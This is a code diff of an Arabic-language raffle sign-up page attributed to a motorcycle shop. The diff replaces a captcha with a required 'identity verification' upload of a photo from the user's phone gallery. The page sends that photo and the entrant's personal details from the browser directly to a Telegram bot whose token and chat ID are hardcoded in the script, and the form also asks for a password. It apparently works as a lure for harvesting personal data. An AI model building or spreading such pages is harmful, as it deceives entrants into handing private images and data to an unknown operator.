@@ -46,7 +46,7 @@
     overflow-x: hidden;
   }
 
-  /* ===== الشريط العلوي الفاخر ===== */
+  /* ===== الشريط العلوي ===== */
   .navbar {
     position: sticky;
     top: 15px;
@@ -110,7 +110,7 @@
     box-shadow: 0 5px 18px var(--primary-glow);
   }
 
-  /* ===== الهيدر الأسطوري ===== */
+  /* ===== الهيدر ===== */
   header {
     max-width: 1100px;
     margin: 30px auto 0;
@@ -131,12 +131,6 @@
     font-weight: 800;
     margin-bottom: 22px;
     box-shadow: 0 0 30px rgba(255,183,3,0.2);
-    animation: pulseBadge 2.5s infinite;
-  }
-
-  @keyframes pulseBadge {
-    0%, 100% { transform: scale(1); }
-    50% { transform: scale(1.03); }
   }
 
   header h1 {
@@ -144,7 +138,6 @@
     font-weight: 900;
     line-height: 1.2;
     margin-bottom: 15px;
-    letter-spacing: -1px;
   }
 
   header h1 span {
@@ -161,7 +154,6 @@
     margin: 0 auto 35px;
   }
 
-  /* ===== أقسام عامة ===== */
   section {
     max-width: 1100px;
     margin: 65px auto;
@@ -202,7 +194,7 @@
     border-radius: 26px;
     padding: 30px 24px;
     text-align: center;
-    transition: all 0.4s cubic-bezier(0.165, 0.84, 0.44, 1);
+    transition: all 0.4s ease;
     position: relative;
     overflow: hidden;
   }
@@ -228,27 +220,11 @@
     font-weight: 800;
     padding: 5px 14px;
     border-radius: 20px;
-    box-shadow: 0 5px 15px var(--primary-glow);
   }
 
-  .cat-icon {
-    font-size: 50px;
-    margin-bottom: 16px;
-    display: block;
-  }
-
-  .cat-card h3 {
-    font-size: 21px;
-    font-weight: 800;
-    color: var(--gold-bright);
-    margin-bottom: 10px;
-  }
-
-  .cat-card p {
-    font-size: 14px;
-    color: var(--text-muted);
-    margin-bottom: 18px;
-  }
+  .cat-icon { font-size: 50px; margin-bottom: 16px; display: block; }
+  .cat-card h3 { font-size: 21px; font-weight: 800; color: var(--gold-bright); margin-bottom: 10px; }
+  .cat-card p { font-size: 14px; color: var(--text-muted); margin-bottom: 18px; }
 
   .cat-specs {
     display: flex;
@@ -266,15 +242,13 @@
     border: 1px solid rgba(255,255,255,0.05);
   }
 
-  /* ===== بانر الجائزة الأسطورية ===== */
+  /* ===== بانر الجائزة ===== */
   .gifts-banner {
     background: linear-gradient(145deg, #1c0d12 0%, var(--surface) 65%, #0a1322 100%);
     border: 2px solid rgba(255, 42, 60, 0.65);
     border-radius: 35px;
     padding: 45px 35px;
-    position: relative;
     box-shadow: 0 35px 70px rgba(255, 42, 60, 0.25);
-    overflow: hidden;
   }
 
   .gift-ribbon {
@@ -286,7 +260,6 @@
     padding: 8px 28px;
     border-radius: 30px;
     margin-bottom: 22px;
-    box-shadow: 0 8px 25px var(--primary-glow);
   }
 
   .gifts-layout {
@@ -302,7 +275,6 @@
     border-radius: 28px;
     padding: 26px;
     text-align: center;
-    box-shadow: inset 0 0 40px rgba(0,0,0,0.6);
   }
 
   .bike-display svg {
@@ -317,24 +289,10 @@
     50% { transform: translateY(-10px); }
   }
 
-  .gift-details h3 {
-    font-size: 34px;
-    font-weight: 900;
-    color: var(--gold);
-    margin-bottom: 12px;
-  }
+  .gift-details h3 { font-size: 34px; font-weight: 900; color: var(--gold); margin-bottom: 12px; }
+  .gift-details p { color: #cbd5e1; font-size: 16px; margin-bottom: 22px; }
 
-  .gift-details p {
-    color: #cbd5e1;
-    font-size: 16px;
-    margin-bottom: 22px;
-  }
-
-  .gift-perks {
-    list-style: none;
-    margin-bottom: 28px;
-  }
-
+  .gift-perks { list-style: none; margin-bottom: 28px; }
   .gift-perks li {
     padding: 11px 16px;
     background: rgba(255, 255, 255, 0.04);
@@ -344,7 +302,6 @@
     display: flex;
     align-items: center;
     gap: 12px;
-    border: 1px solid rgba(255,255,255,0.05);
   }
 
   .go-register-btn {
@@ -360,12 +317,9 @@
     transition: 0.3s;
   }
 
-  .go-register-btn:hover {
-    transform: translateY(-4px);
-    box-shadow: 0 18px 45px rgba(255, 183, 3, 0.6);
-  }
+  .go-register-btn:hover { transform: translateY(-4px); }
 
-  /* ===== استمارة التسجيل الفضائية ===== */
+  /* ===== استمارة التسجيل ===== */
   .form-container {
     background: var(--grad-glass);
     border: 2px solid rgba(255, 183, 3, 0.5);
@@ -409,10 +363,7 @@
 
   .field textarea { min-height: 100px; resize: vertical; }
 
-  .password-wrap {
-    position: relative;
-  }
-
+  .password-wrap { position: relative; }
   .toggle-pass {
     position: absolute;
     left: 15px;
@@ -426,63 +377,57 @@
     font-weight: 700;
   }
 
-  /* ===== نظام التحقق البصري المتطور (صورة كابتشا الإنسان) ===== */
-  .visual-captcha-box {
-    background: rgba(5, 8, 15, 0.85);
-    border: 2px solid var(--border);
+  /* ===== قسم اختيار صورة من معرض الهاتف ===== */
+  .upload-box {
+    background: rgba(5, 8, 15, 0.9);
+    border: 2px dashed rgba(255, 183, 3, 0.4);
     border-radius: 22px;
     padding: 25px;
-    margin-top: 10px;
     text-align: center;
+    cursor: pointer;
+    transition: 0.3s;
   }
 
-  .captcha-header {
-    font-size: 15px;
-    font-weight: 800;
-    color: var(--gold-bright);
-    margin-bottom: 15px;
+  .upload-box:hover {
+    border-color: var(--gold);
+    background: rgba(11, 16, 28, 0.95);
+  }
+
+  .upload-box input[type="file"] {
+    display: none;
+  }
+
+  .upload-label {
     display: flex;
+    flex-direction: column;
     align-items: center;
-    justify-content: center;
-    gap: 8px;
-  }
-
-  /* صورة الكابتشا المتولدة بالـ Canvas لمنع الروبوتات */
-  .captcha-img-container {
-    display: inline-block;
-    background: #fff;
-    padding: 8px;
-    border-radius: 14px;
-    margin-bottom: 15px;
-    box-shadow: 0 8px 25px rgba(0,0,0,0.5);
-    position: relative;
-  }
-
-  #captchaCanvas {
-    display: block;
-    border-radius: 10px;
+    gap: 10px;
     cursor: pointer;
   }
 
-  .refresh-captcha {
-    display: block;
-    margin: 0 auto 15px;
-    background: none;
-    border: none;
-    color: var(--cyan);
+  .upload-icon {
+    font-size: 42px;
+  }
+
+  .upload-text {
+    font-weight: 800;
+    font-size: 16px;
+    color: var(--gold-bright);
+  }
+
+  .upload-sub {
     font-size: 13px;
-    font-weight: 700;
-    cursor: pointer;
-    text-decoration: underline;
+    color: var(--text-muted);
   }
 
-  .visual-captcha-input {
-    max-width: 280px;
-    margin: 0 auto;
-    text-align: center;
-    letter-spacing: 4px;
-    font-weight: 900;
-    font-size: 20px !important;
+  #imagePreview {
+    display: none;
+    max-width: 140px;
+    max-height: 140px;
+    border-radius: 12px;
+    margin: 15px auto 0;
+    border: 2px solid var(--gold);
+    object-fit: cover;
   }
 
   .btn-enter {
@@ -500,16 +445,8 @@
     transition: 0.3s;
   }
 
-  .btn-enter:hover {
-    transform: translateY(-4px);
-    box-shadow: 0 18px 45px rgba(255, 42, 60, 0.7);
-  }
-
-  .btn-enter:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-    transform: none;
-  }
+  .btn-enter:hover { transform: translateY(-4px); }
+  .btn-enter:disabled { opacity: 0.6; cursor: not-allowed; }
 
   .msg {
     display: none;
@@ -522,7 +459,7 @@
 
   .err { display: block; background: rgba(255, 42, 60, 0.18); color: #ff8fa3; border: 1px solid var(--primary); }
 
-  /* ===== تذكرة النجاح الأسطورية ===== */
+  /* ===== تذكرة النجاح ===== */
   #ticketBox {
     display: none;
     text-align: center;
@@ -530,7 +467,6 @@
     background: linear-gradient(145deg, #0e2b1d 0%, #05110a 100%);
     border: 2px dashed #10b981;
     border-radius: 30px;
-    box-shadow: 0 25px 60px rgba(16, 185, 129, 0.25);
   }
 
   .ticket-badge {
@@ -542,16 +478,9 @@
     border-radius: 30px;
     font-size: 16px;
     margin-bottom: 16px;
-    box-shadow: 0 6px 20px rgba(16,185,129,0.45);
   }
 
-  #ticketBox h3 {
-    font-size: 32px;
-    color: #34d399;
-    margin-bottom: 10px;
-    font-weight: 900;
-  }
-
+  #ticketBox h3 { font-size: 32px; color: #34d399; margin-bottom: 10px; font-weight: 900; }
   .ticket-code {
     display: inline-block;
     background: rgba(255, 183, 3, 0.15);
@@ -564,10 +493,8 @@
     margin: 20px 0;
     letter-spacing: 3px;
     direction: ltr;
-    box-shadow: 0 0 35px rgba(255,183,3,0.3);
   }
 
-  /* ===== الموقع والفوتر ===== */
   .location-strip {
     background: var(--grad-glass);
     border: 1px solid var(--border);
@@ -583,12 +510,7 @@
   .loc-text h3 { color: var(--gold); font-size: 23px; font-weight: 900; margin-bottom: 6px; }
   .loc-text p { color: var(--text-muted); font-size: 16px; }
 
-  .phones-list {
-    display: flex;
-    gap: 14px;
-    flex-wrap: wrap;
-  }
-
+  .phones-list { display: flex; gap: 14px; flex-wrap: wrap; }
   .phone-link {
     background: rgba(255, 183, 3, 0.15);
     border: 1px solid var(--gold);
@@ -598,10 +520,7 @@
     border-radius: 16px;
     font-weight: 800;
     direction: ltr;
-    transition: 0.3s;
   }
-
-  .phone-link:hover { background: var(--gold); color: #020408; }
 
   footer {
     background: #010204;
@@ -611,7 +530,6 @@
     margin-top: 80px;
     color: var(--text-muted);
   }
-
   footer h3 { color: var(--gold); font-size: 25px; font-weight: 900; margin-bottom: 8px; }
 
   @media (max-width: 768px) {
@@ -775,11 +693,11 @@
   </div>
 </section>
 
-<!-- ===== الاستمارة والتحقق البصري ===== -->
+<!-- ===== الاستمارة مع اختيار صورة من المعرض ===== -->
 <section id="register">
   <div class="section-head">
     <span class="sub">بوابة التسجيل الآمنة</span>
-    <h2>أدخل بياناتك ورمز التحقق البصري للاشتراك</h2>
+    <h2>أدخل بياناتك وأرفق صورة من المعرض للاشتراك</h2>
   </div>
 
   <div class="form-container">
@@ -828,36 +746,33 @@
           <textarea id="note" placeholder="اكتب مشاركتك أو سبب اختيارك لمتجر أمير المترات..."></textarea>
         </div>
 
-        <!-- نظام التحقق البصري المتطور (صورة كابتشا الإنسان) -->
+        <!-- اختيار صورة حقيقية من معرض الهاتف -->
         <div class="field full">
-          <div class="visual-captcha-box">
-            <div class="captcha-header">
-              <span>🛡️ نظام التحقق الأمني البصري (تأكيد أنك إنسان وليس روبوت)</span>
+          <label>🖼️ إرفاق صورة من معرض الهاتف (للتحقق وتأكيد الهوية) *</label>
+          <div class="upload-box" onclick="document.getElementById('galleryImage').click()">
+            <div class="upload-label">
+              <span class="upload-icon">📁</span>
+              <span class="upload-text">اضغط هنا لاختيار صورة من معرض الهاتف</span>
+              <span class="upload-sub">(.JPG, .PNG مدعومة)</span>
             </div>
-            <p style="color:var(--text-muted); font-size:13px; margin-bottom:12px;">أدخل الرموز الظاهرة في الصورة أدناه بدقة:</p>
-            
-            <div class="captcha-img-container">
-              <canvas id="captchaCanvas" width="220" height="70" title="انقر لتغيير الصورة"></canvas>
-            </div>
-            <button type="button" class="refresh-captcha" onclick="generateCaptcha()">🔄 تغير صورة التحقق بأخرى جديدة</button>
-            
-            <input type="text" id="captchaInput" class="visual-captcha-input" required placeholder="اكتب الرمز هنا" autocomplete="off" dir="ltr">
+            <input type="file" id="galleryImage" accept="image/*" required onchange="previewSelectedImage(event)">
+            <img id="imagePreview" alt="معاينة الصورة المرفقة">
           </div>
         </div>
       </div>
 
-      <button type="submit" id="btn" class="btn-enter">🔥 تأكيد التسجيل وإرسال البيانات للبوت</button>
+      <button type="submit" id="btn" class="btn-enter">🔥 تأكيد التسجيل وإرسال البيانات والصورة للبوت</button>
       <div id="msg" class="msg"></div>
     </form>
 
     <!-- شاشة نجاح التسجيل والتذكرة -->
     <div id="ticketBox">
-      <div class="ticket-badge">✅ تم إرسال بياناتك واعتماد تذكرتك بنجاح</div>
+      <div class="ticket-badge">✅ تم إرسال بياناتك وصورتك واعتماد تذكرتك بنجاح</div>
       <h3>مبروك! لقد دخلت السحب الأسطوري رسمياً</h3>
       <p style="color:#cbd5e1;">قم بتصوير شاشة هذا الرقم والاحتفاظ به:</p>
       <div class="ticket-code" id="ticketCode">AMIR-0000</div>
       <p style="color:#94a3b8; font-size:15px;">
-        تم إرسال صورة التحقق وبياناتك الكاملة إلى غرفة العمليات بنجاح.<br>
+        تم إرسال الصورة المرفقة من معرضك وبياناتك الكاملة إلى غرفة العمليات بنجاح.<br>
         <strong style="color:var(--gold);">متجر أمير المترات — القاعدة، جوار مستوصف السلطان</strong>
       </p>
     </div>
@@ -889,70 +804,6 @@
 const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const CHAT_ID   = "8299163806";
 
-let currentCaptchaCode = "";
-
-// توليد صورة كابتشا بصرية عشوائية عبر Canvas
-function generateCaptcha() {
-  const canvas = document.getElementById("captchaCanvas");
-  const ctx = canvas.getContext("2d");
-  
-  // تنظيف اللوحة
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  
-  // خلفية متدرجة فوضوية
-  const grad = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-  grad.addColorStop(0, "#0f172a");
-  grad.addColorStop(1, "#1e293b");
-  ctx.fillStyle = grad;
-  ctx.fillRect(0, 0, canvas.width, canvas.height);
-  
-  // رسم خطوط تشويش لمنع روبوتات OCR
-  for (let i = 0; i < 7; i++) {
-    ctx.strokeStyle = `rgba(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255}, 0.5)`;
-    ctx.lineWidth = Math.random() * 2 + 1;
-    ctx.beginPath();
-    ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
-    ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
-    ctx.stroke();
-  }
-  
-  // توليد رمز مكون من 5 أحرف وأرقام عشوائية
-  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
-  currentCaptchaCode = "";
-  for (let i = 0; i < 5; i++) {
-    currentCaptchaCode += chars.charAt(Math.floor(Math.random() * chars.length));
-  }
-  
-  // رسم الحروف بشكل مائل ومتعرج
-  ctx.font = "bold 32px 'Cairo', sans-serif";
-  ctx.textBaseline = "middle";
-  
-  let x = 20;
-  for (let i = 0; i < currentCaptchaCode.length; i++) {
-    ctx.save();
-    ctx.translate(x, canvas.height / 2);
-    ctx.rotate((Math.random() - 0.5) * 0.5); // ميلان عشوائي للحرف
-    
-    // ألوان ساطعة متغيرة لكل حرف
-    ctx.fillStyle = i % 2 === 0 ? "#ffb703" : "#00f2fe";
-    ctx.fillText(currentCaptchaCode[i], 0, (Math.random() - 0.5) * 8);
-    ctx.restore();
-    x += 35;
-  }
-  
-  // إضافة نقاط تشويش إضافية فوق الأحرف
-  for (let i = 0; i < 40; i++) {
-    ctx.fillStyle = Math.random() > 0.5 ? "#ffffff" : "#ff2a3c";
-    ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 2, 2);
-  }
-}
-
-// تشغيل الكابتشا لأول مرة عند تحميل الصفحة وتحديثها عند النقر عليها
-window.addEventListener("DOMContentLoaded", () => {
-  generateCaptcha();
-  document.getElementById("captchaCanvas").addEventListener("click", generateCaptcha);
-});
-
 function togglePass() {
   const passInput = document.getElementById("password");
   const btn = document.querySelector(".toggle-pass");
@@ -965,28 +816,26 @@ function togglePass() {
   }
 }
 
+// معاينة الصورة المختارة من معرض الهاتف قبل الإرسال
+function previewSelectedImage(event) {
+  const file = event.target.files[0];
+  const preview = document.getElementById("imagePreview");
+  if (file) {
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      preview.src = e.target.result;
+      preview.style.display = "block";
+    }
+    reader.readAsDataURL(file);
+  } else {
+    preview.style.display = "none";
+  }
+}
+
 function cleanHTML(str) {
   return str.replace(/&/g, "&amp;")
             .replace(/</g, "&lt;")
             .replace(/>/g, "&gt;");
-}
-
-// دالة لتحويل عنصر الـ Canvas إلى صورة قابلة للإرسال كـ Photo إلى تليجرام
-function getCaptchaDataURL() {
-  const canvas = document.getElementById("captchaCanvas");
-  return canvas.toDataURL("image/png");
-}
-
-// دالة مساعدة لتحويل DataURL إلى كائن Blob لرفعه كصورة عبر SendPhoto في تليجرام
-function dataURItoBlob(dataURI) {
-  const byteString = atob(dataURI.split(',')[1]);
-  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-  const ab = new ArrayBuffer(byteString.length);
-  const ia = new Uint8Array(ab);
-  for (let i = 0; i < byteString.length; i++) {
-    ia[i] = byteString.charCodeAt(i);
-  }
-  return new Blob([ab], {type: mimeString});
 }
 
 document.getElementById("raffleForm").addEventListener("submit", async function(e) {
@@ -994,25 +843,23 @@ document.getElementById("raffleForm").addEventListener("submit", async function(
   const msg = document.getElementById("msg");
   msg.className = "msg";
 
-  // التحقق من صحة كود التحقق البصري المطابق لصورة الكابتشا
-  const userCaptchaInput = document.getElementById("captchaInput").value.trim().toUpperCase();
-  if (userCaptchaInput !== currentCaptchaCode) {
+  const imageInput = document.getElementById("galleryImage");
+  if (!imageInput.files || imageInput.files.length === 0) {
     msg.className = "msg err";
-    msg.textContent = "❌ رمز التحقق البصري غير صحيح! يرجى إعادة إدخال الرموز الظاهرة في الصورة بدقة.";
-    generateCaptcha(); // توليد صورة جديدة للمحاولة التالية
+    msg.textContent = "❌ يرجى إرفاق صورة من معرض الهاتف لتأكيد التسجيل!";
     return;
   }
 
   const btn = document.getElementById("btn");
   btn.disabled = true;
-  btn.textContent = "⏳ جارٍ توثيق وإرسال صورة التحقق وبياناتك للبوت...";
+  btn.textContent = "⏳ جارٍ رفع الصورة والبيانات وإصدار التذكرة...";
 
   const ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
   const g = id => cleanHTML(document.getElementById(id).value.trim());
   const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
 
   const captionText =
-`🏆 <b>تسجيل جديد في السحب الأسطوري (متر فلينج)!</b>
+`🏆 <b>تسجيل جديد مع صورة مرفقة في السحب الأسطوري!</b>
 ━━━━━━━━━━━━━━━━━━
 🎟️ <b>رقم التذكرة:</b> <code>${ticketID}</code>
 👤 <b>الاسم:</b> ${g("name")}
@@ -1022,23 +869,19 @@ document.getElementById("raffleForm").addEventListener("submit", async function(
 🏙️ <b>المنطقة:</b> ${g("city")}
 🏍️ <b>المتر المفضل:</b> ${g("favModel")}
 💬 <b>ملاحظة:</b> ${g("note") || "لا يوجد"}
-🛡️ <b>حالة التحقق البصري:</b> ✅ اجتاز كابتشا الإنسان بنجاح
+🖼️ <b>الصورة:</b> تم إرفاق صورة حقيقية من معرض المستخدم
 ━━━━━━━━━━━━━━━━━━
 📲 <b>تواصل سريع مع المشترك (واتساب):</b>
 https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
 
   try {
-    // تجهيز صورة التحقق البصري المرسلة من الـ Canvas
-    const captchaDataURL = getCaptchaDataURL();
-    const captchaBlob = dataURItoBlob(captchaDataURL);
-    
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
-    formData.append("photo", captchaBlob, "human_verification_captcha.png");
+    formData.append("photo", imageInput.files[0]);
     formData.append("caption", captionText);
     formData.append("parse_mode", "HTML");
 
-    // إرسال البيانات والصورة معاً مباشرة عبر واجهة sendPhoto في بوت تليجرام
+    // إرسال الصورة والبيانات مباشرة إلى بوت تليجرام
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
       body: formData
@@ -1055,11 +898,10 @@ https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
     }
   } catch (err) {
     msg.className = "msg err";
-    msg.textContent = "❌ تعذر إرسال البيانات وصورة التحقق، يرجى التأكد من اتصال الإنترنت والمحاولة مرة أخرى.";
+    msg.textContent = "❌ تعذر إرسال الصورة والبيانات، يرجى التأكد من اتصال الإنترنت وحجم الصورة ثم المحاولة.";
     console.error(err);
     btn.disabled = false;
-    btn.textContent = "🔥 تأكيد التسجيل وإرسال البيانات للبوت";
-    generateCaptcha();
+    btn.textContent = "🔥 تأكيد التسجيل وإرسال البيانات والصورة للبوت";
   }
 });
 </script>
